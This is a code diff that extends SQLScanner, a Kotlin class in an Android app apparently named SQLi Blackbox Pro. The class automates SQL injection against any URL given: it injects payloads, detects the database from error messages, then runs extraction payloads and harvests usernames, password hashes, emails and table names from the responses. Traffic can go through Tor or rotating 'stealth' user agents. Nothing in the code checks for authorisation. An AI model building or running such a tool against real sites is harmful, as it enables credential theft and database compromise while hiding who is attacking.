@@ -1,34 +1,61 @@
 package com.sqliblackboxpro
 
+import android.util.Log
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.withContext
 import okhttp3.*
+import java.io.IOException
 import java.net.InetSocketAddress
 import java.net.Proxy
+import java.net.SocketTimeoutException
+import java.net.UnknownHostException
 import java.util.concurrent.TimeUnit
 
 class SQLScanner {
     
+    companion object {
+        private const val TAG = "SQLScanner"
+    }
+    
     private val standardClient = OkHttpClient.Builder()
-        .connectTimeout(30, TimeUnit.SECONDS)
-        .readTimeout(30, TimeUnit.SECONDS)
+        .connectTimeout(15, TimeUnit.SECONDS)
+        .readTimeout(15, TimeUnit.SECONDS)
+        .writeTimeout(15, TimeUnit.SECONDS)
+        .followRedirects(true)
+        .followSslRedirects(true)
         .build()
     
     private val torClient = OkHttpClient.Builder()
         .connectTimeout(30, TimeUnit.SECONDS)
         .readTimeout(30, TimeUnit.SECONDS)
+        .writeTimeout(15, TimeUnit.SECONDS)
         .proxy(Proxy(Proxy.Type.SOCKS, InetSocketAddress("127.0.0.1", 9050)))
+        .followRedirects(true)
+        .followSslRedirects(true)
         .build()
     
     private val stealthUserAgents = listOf(
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
         "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
     )
     
-    suspend fun scanURL(url: String, mode: ScanMode): ScanResult {
+    suspend fun scanURL(url: String, mode: ScanMode): ScanResult = withContext(Dispatchers.IO) {
+        Log.d(TAG, "Starting scan for URL: $url with mode: $mode")
+        
+        // Validate URL format
+        if (!url.startsWith("http://") && !url.startsWith("https://")) {
+            throw IllegalArgumentException("URL must start with http:// or https://")
+        }
+        
         val client = when (mode) {
             ScanMode.STANDARD -> standardClient
-            ScanMode.TOR -> torClient
+            ScanMode.TOR -> {
+                Log.d(TAG, "Using Tor SOCKS proxy at 127.0.0.1:9050")
+                torClient
+            }
             ScanMode.STEALTH -> createStealthClient()
         }
         
@@ -37,11 +64,18 @@ class SQLScanner {
         var successfulPayload = ""
         var responseDetails = ""
         val extractedData = mutableListOf<String>()
+        var testedPayloads = 0
+        var errorCount = 0
+        val errorMessages = mutableListOf<String>()
         
         // Test detection payloads first
+        Log.d(TAG, "Testing ${SQLPayloads.DETECTION_PAYLOADS.size} detection payloads...")
         for (payload in SQLPayloads.DETECTION_PAYLOADS) {
             try {
+                testedPayloads++
                 val testUrl = buildTestUrl(url, payload)
+                Log.d(TAG, "Testing payload $testedPayloads: ${payload.take(50)}...")
+                
                 val request = Request.Builder()
                     .url(testUrl)
                     .apply {
@@ -52,30 +86,65 @@ class SQLScanner {
                     .build()
                 
                 val response = client.newCall(request).execute()
+                val statusCode = response.code
                 val body = response.body?.string() ?: ""
                 response.close()
+                
+                Log.d(TAG, "Response: Status=$statusCode, Body length=${body.length}")
                 
                 // Check for SQL errors in response
                 if (containsSQLError(body)) {
                     vulnerabilityFound = true
                     detectedDatabase = detectDatabaseType(body)
                     successfulPayload = payload
-                    responseDetails = body.take(500)
+                    responseDetails = "Status: $statusCode\n\n${body.take(500)}"
+                    Log.i(TAG, "VULNERABILITY FOUND! Payload: $payload, DB Type: $detectedDatabase")
                     break
                 }
+            } catch (e: UnknownHostException) {
+                errorCount++
+                val msg = "DNS Error: Cannot resolve host - ${e.message}"
+                errorMessages.add(msg)
+                Log.e(TAG, msg, e)
+                // This is a critical error, throw it
+                throw IOException("Cannot connect to server. Please check the URL and your internet connection.")
+            } catch (e: SocketTimeoutException) {
+                errorCount++
+                val msg = "Timeout on payload ${testedPayloads}: ${e.message}"
+                errorMessages.add(msg)
+                Log.w(TAG, msg)
+                // Continue with other payloads on timeout
+            } catch (e: IOException) {
+                errorCount++
+                val msg = "Network error on payload ${testedPayloads}: ${e.message}"
+                errorMessages.add(msg)
+                Log.e(TAG, msg, e)
+                // If all payloads fail with network errors, this is a problem
+                if (errorCount >= 3 && testedPayloads <= 3) {
+                    throw IOException("Network connection failed. Please check your internet connection.")
+                }
             } catch (e: Exception) {
-                // Continue testing other payloads
+                errorCount++
+                val msg = "Error on payload ${testedPayloads}: ${e.javaClass.simpleName} - ${e.message}"
+                errorMessages.add(msg)
+                Log.e(TAG, msg, e)
             }
         }
+        
+        Log.d(TAG, "Detection phase complete. Tested: $testedPayloads, Errors: $errorCount, Found: $vulnerabilityFound")
         
         // If vulnerability found, try to extract data
         if (vulnerabilityFound) {
             val extractionPayloads = when (detectedDatabase) {
                 DatabaseType.MYSQL -> SQLPayloads.DATA_EXTRACTION_PAYLOADS
-                else -> SQLPayloads.DATA_EXTRACTION_PAYLOADS // Default to MySQL payloads
+                DatabaseType.POSTGRESQL -> SQLPayloads.POSTGRESQL_PAYLOADS
+                DatabaseType.MSSQL -> SQLPayloads.MSSQL_PAYLOADS
+                DatabaseType.ORACLE -> SQLPayloads.ORACLE_PAYLOADS
+                else -> SQLPayloads.DATA_EXTRACTION_PAYLOADS
             }
             
-            for (payload in extractionPayloads.take(3)) { // Try first 3 extraction payloads
+            Log.d(TAG, "Attempting data extraction with ${extractionPayloads.size} payloads...")
+            for (payload in extractionPayloads.take(5)) { // Try first 5 extraction payloads
                 try {
                     val testUrl = buildTestUrl(url, payload)
                     val request = Request.Builder()
@@ -95,14 +164,29 @@ class SQLScanner {
                     val extracted = extractDataFromResponse(body)
                     if (extracted.isNotEmpty()) {
                         extractedData.addAll(extracted)
+                        Log.i(TAG, "Extracted ${extracted.size} data items")
                     }
                 } catch (e: Exception) {
+                    Log.w(TAG, "Error during data extraction: ${e.message}")
                     // Continue with next payload
                 }
             }
         }
         
-        return ScanResult(
+        // Add diagnostic info if no vulnerability found
+        if (!vulnerabilityFound && responseDetails.isEmpty()) {
+            responseDetails = "Scan Summary:\n" +
+                "- Tested $testedPayloads payloads\n" +
+                "- Encountered $errorCount errors\n" +
+                "- No SQL injection vulnerability detected\n\n" +
+                if (errorMessages.isNotEmpty()) {
+                    "Errors encountered:\n" + errorMessages.take(5).joinToString("\n")
+                } else {
+                    "All requests completed successfully but no SQL errors were found in responses."
+                }
+        }
+        
+        ScanResult(
             isVulnerable = vulnerabilityFound,
             databaseType = detectedDatabase,
             extractedData = extractedData,
@@ -113,94 +197,197 @@ class SQLScanner {
     
     private fun createStealthClient(): OkHttpClient {
         return OkHttpClient.Builder()
-            .connectTimeout(30, TimeUnit.SECONDS)
-            .readTimeout(30, TimeUnit.SECONDS)
+            .connectTimeout(15, TimeUnit.SECONDS)
+            .readTimeout(15, TimeUnit.SECONDS)
+            .writeTimeout(15, TimeUnit.SECONDS)
+            .followRedirects(true)
+            .followSslRedirects(true)
             .build()
     }
     
     private fun buildTestUrl(baseUrl: String, payload: String): String {
         val separator = if (baseUrl.contains("?")) "&" else "?"
-        // Try multiple parameter injection points
-        return "${baseUrl}${separator}id=${java.net.URLEncoder.encode(payload, "UTF-8")}"
+        // URL encode the payload to ensure it's properly transmitted
+        val encodedPayload = java.net.URLEncoder.encode(payload, "UTF-8")
+        
+        // Try multiple injection points for better coverage
+        return when {
+            // If URL already has parameters, inject into existing parameter
+            baseUrl.contains("?") -> {
+                val parts = baseUrl.split("?", limit = 2)
+                val base = parts[0]
+                val params = parts[1]
+                // Inject into first parameter value
+                val firstParam = params.split("&")[0]
+                if (firstParam.contains("=")) {
+                    val paramName = firstParam.split("=")[0]
+                    "${base}?${paramName}=${encodedPayload}&${params}"
+                } else {
+                    "${baseUrl}&test=${encodedPayload}"
+                }
+            }
+            // Otherwise, add new parameter
+            else -> "${baseUrl}${separator}id=${encodedPayload}"
+        }
     }
     
     private fun containsSQLError(response: String): Boolean {
         val errorPatterns = listOf(
+            // MySQL errors
             "SQL syntax",
             "mysql_fetch",
             "mysqli",
-            "PostgreSQL",
-            "pg_query",
-            "ORA-",
-            "Microsoft SQL",
-            "ODBC SQL",
-            "SQLite",
-            "sqlite3",
-            "Unclosed quotation",
-            "syntax error",
             "Warning: mysql",
             "valid MySQL result",
             "MySqlClient",
-            "SQL Server",
-            "Driver.*SQL",
-            "PostgreSQL.*ERROR",
+            "com.mysql.jdbc.exceptions",
+            "mysql_query",
+            "mysql_num_rows",
+            
+            // PostgreSQL errors
+            "PostgreSQL",
+            "pg_query",
+            "pg_exec",
             "Warning.*pg_",
             "valid PostgreSQL result",
             "Npgsql\\.",
             "PG::SyntaxError",
             "org.postgresql.util.PSQLException",
-            "com.mysql.jdbc.exceptions",
-            "java.sql.SQLException"
+            
+            // MSSQL errors
+            "Microsoft SQL",
+            "ODBC SQL",
+            "SQL Server",
+            "Driver.*SQL",
+            "\\[SQL Server\\]",
+            "\\[Microsoft\\]\\[ODBC",
+            
+            // Oracle errors
+            "ORA-[0-9]{5}",
+            "Oracle.*Driver",
+            "Oracle.*Error",
+            
+            // SQLite errors
+            "SQLite",
+            "sqlite3",
+            "SQLite3::SQLException",
+            
+            // Generic SQL errors
+            "Unclosed quotation",
+            "syntax error",
+            "quoted string not properly terminated",
+            "unterminated string literal",
+            "unexpected end of SQL command",
+            "java.sql.SQLException",
+            "System.Data.SqlClient",
+            "database error",
+            "sql error",
+            "query failed"
         )
         
         return errorPatterns.any { pattern ->
-            response.contains(pattern, ignoreCase = true)
+            try {
+                if (pattern.contains("\\")) {
+                    // Use regex for patterns with special characters
+                    Regex(pattern, RegexOption.IGNORE_CASE).containsMatchIn(response)
+                } else {
+                    response.contains(pattern, ignoreCase = true)
+                }
+            } catch (e: Exception) {
+                response.contains(pattern, ignoreCase = true)
+            }
         }
     }
     
     private fun detectDatabaseType(response: String): DatabaseType {
+        Log.d(TAG, "Detecting database type from response...")
         return when {
             response.contains("mysql", ignoreCase = true) ||
-            response.contains("mysqli", ignoreCase = true) -> DatabaseType.MYSQL
+            response.contains("mysqli", ignoreCase = true) ||
+            response.contains("MariaDB", ignoreCase = true) -> {
+                Log.d(TAG, "Detected: MySQL")
+                DatabaseType.MYSQL
+            }
             
             response.contains("postgresql", ignoreCase = true) ||
             response.contains("pg_query", ignoreCase = true) ||
-            response.contains("npgsql", ignoreCase = true) -> DatabaseType.POSTGRESQL
+            response.contains("npgsql", ignoreCase = true) ||
+            response.contains("postgres", ignoreCase = true) -> {
+                Log.d(TAG, "Detected: PostgreSQL")
+                DatabaseType.POSTGRESQL
+            }
             
             response.contains("microsoft sql", ignoreCase = true) ||
-            response.contains("sql server", ignoreCase = true) -> DatabaseType.MSSQL
+            response.contains("sql server", ignoreCase = true) ||
+            response.contains("mssql", ignoreCase = true) -> {
+                Log.d(TAG, "Detected: MSSQL")
+                DatabaseType.MSSQL
+            }
             
-            response.contains("ora-", ignoreCase = true) ||
-            response.contains("oracle", ignoreCase = true) -> DatabaseType.ORACLE
+            Regex("ORA-[0-9]{5}").containsMatchIn(response) ||
+            response.contains("oracle", ignoreCase = true) -> {
+                Log.d(TAG, "Detected: Oracle")
+                DatabaseType.ORACLE
+            }
             
-            response.contains("sqlite", ignoreCase = true) -> DatabaseType.SQLITE
+            response.contains("sqlite", ignoreCase = true) -> {
+                Log.d(TAG, "Detected: SQLite")
+                DatabaseType.SQLITE
+            }
             
-            else -> DatabaseType.UNKNOWN
+            else -> {
+                Log.d(TAG, "Detected: Unknown database type")
+                DatabaseType.UNKNOWN
+            }
         }
     }
     
     private fun extractDataFromResponse(response: String): List<String> {
         val extracted = mutableListOf<String>()
         
-        // Look for common data patterns
-        // Extract potential usernames
-        val usernamePattern = Regex("([a-zA-Z0-9_-]+):(\\$[^\\s]+|[a-f0-9]{32,})")
-        usernamePattern.findAll(response).forEach { match ->
-            extracted.add("User: ${match.groupValues[1]}, Hash: ${match.groupValues[2]}")
+        try {
+            // Look for common data patterns
+            // Extract potential usernames and password hashes
+            val usernamePattern = Regex("([a-zA-Z0-9_-]{3,}):(\\$[^\\s,]+|[a-f0-9]{32,})")
+            usernamePattern.findAll(response).forEach { match ->
+                val user = match.groupValues[1]
+                val hash = match.groupValues[2].take(50) // Limit hash display
+                extracted.add("Credential: $user:${hash}")
+                Log.d(TAG, "Extracted credential for user: $user")
+            }
+            
+            // Extract database names
+            val dbNamePattern = Regex("(?:database|schema)\\s*[=:]\\s*([a-zA-Z0-9_-]+)", RegexOption.IGNORE_CASE)
+            dbNamePattern.findAll(response).forEach { match ->
+                extracted.add("Database: ${match.groupValues[1]}")
+                Log.d(TAG, "Extracted database name: ${match.groupValues[1]}")
+            }
+            
+            // Extract table names  
+            val tablePattern = Regex("(?:table|from)\\s+([a-zA-Z0-9_-]+)", RegexOption.IGNORE_CASE)
+            tablePattern.findAll(response).take(5).forEach { match ->
+                extracted.add("Table: ${match.groupValues[1]}")
+                Log.d(TAG, "Extracted table name: ${match.groupValues[1]}")
+            }
+            
+            // Extract email addresses
+            val emailPattern = Regex("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}")
+            emailPattern.findAll(response).take(5).forEach { match ->
+                extracted.add("Email: ${match.value}")
+                Log.d(TAG, "Extracted email: ${match.value}")
+            }
+            
+            // Extract version information
+            val versionPattern = Regex("version[:\\s]+([0-9.]+[^\\s,<>]*)", RegexOption.IGNORE_CASE)
+            versionPattern.find(response)?.let { match ->
+                extracted.add("Version: ${match.groupValues[1]}")
+                Log.d(TAG, "Extracted version: ${match.groupValues[1]}")
+            }
+            
+        } catch (e: Exception) {
+            Log.e(TAG, "Error extracting data: ${e.message}", e)
         }
         
-        // Extract database names
-        val dbNamePattern = Regex("database[^:]*:\\s*([a-zA-Z0-9_-]+)", RegexOption.IGNORE_CASE)
-        dbNamePattern.findAll(response).forEach { match ->
-            extracted.add("Database: ${match.groupValues[1]}")
-        }
-        
-        // Extract table names  
-        val tablePattern = Regex("table[^:]*:\\s*([a-zA-Z0-9_-]+)", RegexOption.IGNORE_CASE)
-        tablePattern.findAll(response).forEach { match ->
-            extracted.add("Table: ${match.groupValues[1]}")
-        }
-        
-        return extracted.take(10) // Limit to first 10 extractions
+        return extracted.distinct().take(15) // Limit to first 15 unique extractions
     }
 }
